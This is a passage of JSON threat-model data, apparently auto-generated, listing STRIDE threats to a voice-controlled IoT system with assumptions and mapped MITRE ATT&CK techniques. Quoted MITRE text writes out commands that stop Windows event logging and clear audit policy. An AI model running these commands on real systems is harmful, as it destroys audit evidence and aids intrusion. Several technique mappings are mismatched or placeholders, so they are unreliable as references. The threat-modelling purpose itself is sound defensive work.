                    "Role": "Application Architect",
                    "Condition": "Poor authentication mechanisms"
                },
                {
                    "Assumption": "The system processes commands without storing transaction evidence.",
                    "Role": "System Designer",
                    "Condition": "Insufficient audit trails"
                }
            ],
            "Potential Impact": "Difficulty in attributing actions, denial of responsibility.",
            "MITRE ATT&CK Keywords": [
                "action repudiation",
                "voice command denial",
                "insufficient logging"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "IoT controller unable to prove execution of commands.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller does not keep logs of executed commands.",
                    "Role": "IoT Device Manufacturer",
                    "Condition": "Absence of logging mechanisms"
                },
                {
                    "Assumption": "System time and state are not synchronized.",
                    "Role": "System Administrator",
                    "Condition": "Unsynchronized system clocks"
                },
                {
                    "Assumption": "Data integrity mechanisms are weak or missing.",
                    "Role": "Developer",
                    "Condition": "Lack of integrity checks"
                }
            ],
            "Potential Impact": "Disputes over command execution, lack of accountability.",
            "MITRE ATT&CK Keywords": [
                "command repudiation",
                "execution denial",
                "audit trail gaps"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Server-side application fails to track incoming requests.",
            "Assumptions": [
                {
                    "Assumption": "No logging of server-side requests and responses.",
                    "Role": "Developer",
                    "Condition": "Absence of detailed logging"
                },
                {
                    "Assumption": "Server configuration does not include request tracking.",
                    "Role": "System Administrator",
                    "Condition": "Default or weak configuration"
                },
                {
                    "Assumption": "The application does not enforce strong authentication.",
                    "Role": "Application Architect",
                    "Condition": "Insufficient authentication methods"
                }
            ],
            "Potential Impact": "Difficulty tracing source of actions, denial of events.",
            "MITRE ATT&CK Keywords": [
                "request repudiation",
                "server-side denial",
                "tracking failures"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive voice commands intercepted during transmission.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Cleartext communication"
                },
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Network presence"
                },
                {
                    "Assumption": "No additional layers of data protection are applied.",
                    "Role": "Developer",
                    "Condition": "Absence of data encryption mechanisms"
                }
            ],
            "Potential Impact": "Exposure of sensitive voice commands and data.",
            "MITRE ATT&CK Keywords": [
                "traffic interception",
                "data exposure",
                "cleartext communication"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud service data storage compromised.",
            "Assumptions": [
                {
                    "Assumption": "Sensitive data is stored unencrypted in the cloud.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Lack of encryption at rest"
                },
                {
                    "Assumption": "The attacker can breach cloud storage accounts.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials or security gaps"
                },
                {
                    "Assumption": "Insufficient monitoring of cloud storage access.",
                    "Role": "System Administrator",
                    "Condition": "Weak monitoring practices"
                }
            ],
            "Potential Impact": "Sensitive information accessed by unauthorized individuals.",
            "MITRE ATT&CK Keywords": [
                "cloud data breach",
                "storage compromise",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "IoT devices leak sensitive operational data.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices do not use secure communication channels.",
                    "Role": "IoT Device Manufacturer",
                    "Condition": "Lack of secure communication"
                },
                {
                    "Assumption": "Operational data is not anonymized or encrypted.",
                    "Role": "Developer",
                    "Condition": "Unprotected data transmission"
                },
                {
                    "Assumption": "The attacker can intercept device communication.",
                    "Role": "Attacker",
                    "Condition": "Proximity to or access to network"
                }
            ],
            "Potential Impact": "Operational data exposed, potential operational intelligence leakage.",
            "MITRE ATT&CK Keywords": [
                "IoT data leakage",
                "communication interception",
                "operational data exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Network flood attack targeting the server.",
            "Assumptions": [
                {
                    "Assumption": "Network infrastructure does not have DoS protection mechanisms.",
                    "Role": "Network Engineer",
                    "Condition": "Unprotected network"
                },
                {
                    "Assumption": "The attacker can send a large number of packets to the server.",
                    "Role": "Attacker",
                    "Condition": "High bandwidth capability"
                },
                {
                    "Assumption": "The server is not configured to handle high traffic loads.",
                    "Role": "System Administrator",
                    "Condition": "Default configurations"
                }
            ],
            "Potential Impact": "Server becomes unresponsive, service disruption.",
            "MITRE ATT&CK Keywords": [
                "DoS attack",
                "network flooding",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious voice commands causing system overload.",
            "Assumptions": [
                {
                    "Assumption": "The system processes voice commands without rate limiting.",
                    "Role": "Developer",
                    "Condition": "Lack of rate-limiting mechanisms"
                },
                {
                    "Assumption": "The attacker can continuously send voice commands.",
                    "Role": "Attacker",
                    "Condition": "Unrestricted access"
                },
                {
                    "Assumption": "System capacity planning does not account for abusive scenarios.",
                    "Role": "System Architect",
                    "Condition": "Insufficient capacity planning"
                }
            ],
            "Potential Impact": "System resources exhausted, functionality degradation.",
            "MITRE ATT&CK Keywords": [
                "voice command abuse",
                "resource exhaustion",
                "functionality degradation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "IoT devices receive excessive commands, leading to device malfunction.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices lack command queue and processing limits.",
                    "Role": "IoT Device Manufacturer",
                    "Condition": "Unrestricted command processing"
                },
                {
                    "Assumption": "The attacker can continuously send commands to IoT devices.",
                    "Role": "Attacker",
                    "Condition": "Unrestricted device access"
                },
                {
                    "Assumption": "Devices are not designed to handle high command volume.",
                    "Role": "Hardware Designer",
                    "Condition": "Inadequate design"
                }
            ],
            "Potential Impact": "IoT device malfunction, operational disruption.",
            "MITRE ATT&CK Keywords": [
                "device overload",
                "command flooding",
                "operational disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attackers exploit vulnerabilities in the client-side application to increase privileges.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the client-side application.",
                    "Role": "Attacker",
                    "Condition": "Device access"
                },
                {
                    "Assumption": "The application has known vulnerabilities.",
                    "Role": "Developer",
                    "Condition": "Unpatched software"
                },
                {
                    "Assumption": "The system does not enforce proper privilege separation.",
                    "Role": "System Administrator",
                    "Condition": "Lax privilege management"
                }
            ],
            "Potential Impact": "Gain unauthorized access to higher privilege levels.",
            "MITRE ATT&CK Keywords": [
                "client-side exploitation",
                "privilege escalation",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Port Monitors",
                "description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot.(Citation: Bloxham) \n\nAlternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the `Driver` value of an existing or new arbitrarily named subkey of <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. The Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n",
                "id": "attack-pattern--43881e51-ac74-445b-b4c6-f9f9e9bf23fe",
                "technique_id": "T1547.010"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious user gains admin access to the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication mechanisms in place.",
                    "Role": "Application Architect",
                    "Condition": "Insufficient authentication"
                },
                {
                    "Assumption": "The attacker can leverage social engineering or brute force attacks.",
                    "Role": "Attacker",
                    "Condition": "Persistent attack attempts"
                },
                {
                    "Assumption": "The application does not track privilege escalation attempts.",
                    "Role": "System Administrator",
                    "Condition": "Lack of monitoring"
                }
            ],
            "Potential Impact": "Full control over server-side application and data.",
            "MITRE ATT&CK Keywords": [
                "server compromise",
                "admin access gain",
                "system control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting vulnerabilities in IoT controller software.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of software vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Awareness of vulnerabilities"
                },
                {
                    "Assumption": "IoT controllers run outdated, vulnerable firmware.",
                    "Role": "Device Manufacturer",
                    "Condition": "Unpatched firmware"
                },
                {
                    "Assumption": "The system lacks robust access control mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Weak access controls"
                }
            ],
            "Potential Impact": "Unauthorized control over IoT devices.",
            "MITRE ATT&CK Keywords": [
                "IoT controller exploitation",
                "firmware vulnerability",
                "unauthorized device control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "26",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user\u2019s voice commands to gain unauthorized access to IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a recording of the legitimate user\u2019s voice.",
                    "Role": "Attacker",
                    "Condition": "The voice recording can be obtained through various means such as social engineering or physical access."
                },
                {
                    "Assumption": "The system relies solely on voice recognition for authentication.",
                    "Role": "System Design",
                    "Condition": "No multi-factor authentication is implemented."
                },
                {
                    "Assumption": "The voice recognition system has vulnerabilities or limitations in distinguishing between the legitimate user and the attacker's imitation.",
                    "Role": "Voice Recognition System",
                    "Condition": "The system is not using advanced voice biometrics."
                }
            ],
            "Potential Impact": "Confidentiality: Unauthorized access to sensitive information or devices.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "voice impersonation",
                "IoT devices",
                "user impersonation"
            ],
            "mitre_technique": {
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of the IoT controller to send malicious commands to IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has gained access to the network where the IoT controller operates.",
                    "Role": "Attacker",
                    "Condition": "Network access can be achieved through means such as exploiting vulnerabilities or insider threats."
                },
                {
                    "Assumption": "The IoT controller does not use secure communication protocols.",
                    "Role": "IoT Controller",
                    "Condition": "Plain text communication or weak encryption is used."
                },
                {
                    "Assumption": "There are no additional checks to validate the authenticity of the IoT controller's commands.",
                    "Role": "System Design",
                    "Condition": "No mutual authentication mechanisms in place."
                }
            ],
            "Potential Impact": "Integrity: Manipulation of the commands leading to unintended actions by IoT devices.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "IoT controller",
                "malicious commands"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a fake cloud service to intercept and alter data sent to the legitimate cloud service.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can trick the client-side application into connecting to the fake cloud service.",
                    "Role": "Attacker",
                    "Condition": "DNS spoofing or man-in-the-middle attacks are possible."
                },
                {
                    "Assumption": "The communication between the client-side application and the cloud service is not fully encrypted or uses weak encryption.",
                    "Role": "System Design",
                    "Condition": "Lack of strong TLS/SSL configurations."
                },
                {
                    "Assumption": "The application does not perform rigorous validation of the cloud service's identity.",
                    "Role": "Client-side Application",
                    "Condition": "No verification of server certificates or endpoints."
                }
            ],
            "Potential Impact": "Confidentiality & Integrity: Unauthorized interception and tampering with the data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud service",
                "man-in-the-middle",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Temporary Elevated Cloud Access",
                "description": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. \n\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Azure Just in Time Access 2023)\n\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.(Citation: Google Cloud Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange) \n\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles)\n\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation)\n\n**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022)",
                "id": "attack-pattern--6fa224c7-5091-4595-bf15-3fc9fe2f2c7c",
                "technique_id": "T1548.005"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware of an IoT device to execute harmful actions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the IoT device.",
                    "Role": "Attacker",
                    "Condition": "The device is located in a physically insecure location."
                },
                {
                    "Assumption": "The firmware update process is not secure.",
                    "Role": "IoT Device",
                    "Condition": "No cryptographic signing of firmware or lack of verification checks."
                },
                {
                    "Assumption": "The IoT device does not have mechanisms to detect and mitigate unauthorized firmware changes.",
                    "Role": "IoT Device",
                    "Condition": "No integrity verification or rollback capabilities."
                }
            ],
            "Potential Impact": "Integrity: Corruption or tampering of device functioning leading to harmful actions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "IoT devices",
                "firmware",
                "physical access"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies control requests from the client-side application to the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the communication channel between the client and the IoT controller.",
                    "Role": "Attacker",
                    "Condition": "Network vulnerabilities or specific ecosystem weaknesses."
                },
                {
                    "Assumption": "The communication channel does not employ strong encryption.",
                    "Role": "System Design",
                    "Condition": "Using plain text or inadequate encryption methods."
                },
                {
                    "Assumption": "The system does not validate the integrity of the control requests.",
                    "Role": "System Design",
                    "Condition": "No message integrity verification mechanisms in use."
                }
            ],
            "Potential Impact": "Integrity: Malicious control requests leading to unauthorized device actions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "client-side",
                "IoT controller",
                "control requests"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters stored data in the cloud services to manipulate system behavior.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised the cloud service account or obtained access credentials.",
                    "Role": "Attacker",
                    "Condition": "Credential theft or account takeover strategies are successful."
                },
                {
                    "Assumption": "The cloud service does not have adequate security measures including access controls and data integrity checks.",
                    "Role": "Cloud Service",
                    "Condition": "Insufficient security configurations or lack of monitoring."
                },
                {
                    "Assumption": "There is no regular auditing of data integrity.",
                    "Role": "System Administrator",
                    "Condition": "Disabling or lack of regular review processes."
                }
            ],
            "Potential Impact": "Integrity: Manipulation of data leading to incorrect system operation or user response.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud services",
                "data manipulation",
                "access control"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies sending malicious voice commands by exploiting lack of logging.",
            "Assumptions": [
                {
                    "Assumption": "The system does not implement sufficient logging for voice command activities.",
                    "Role": "System Design",
                    "Condition": "No logs or incomplete logs are kept of command interactions."
                },
                {
                    "Assumption": "Voice command logs do not include metadata or are easily alterable.",
                    "Role": "System Design",
                    "Condition": "Logs are not tamper-evident or lack detailed context."
                },
                {
                    "Assumption": "There is no mechanism to verify the authenticity of the logged voice commands.",
                    "Role": "System Operations",
                    "Condition": "Absence of voice signature verification or digital timestamps."
                }
            ],
            "Potential Impact": "Integrity: Inability to trace actions or investigate incidents involving malicious commands.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "voice commands",
                "logging",
                "metadata"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs unauthorized actions on IoT devices and denies responsibility.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller does not maintain comprehensive logs of the actions taken.",
                    "Role": "System Design",
                    "Condition": "Lack of robust logging at the controller level."
                },
                {
                    "Assumption": "Logs can be easily deleted or modified without detection.",
                    "Role": "System Design",
                    "Condition": "No measures to ensure log integrity or retention."
                },
                {
                    "Assumption": "There are no audit trails linking actions to authenticated users.",
                    "Role": "System Design",
                    "Condition": "No user action mapping or tracking mechanisms in use."
                }
            ],
            "Potential Impact": "Integrity: Challenges in holding actors accountable for unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "IoT devices",
                "unauthorized actions",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
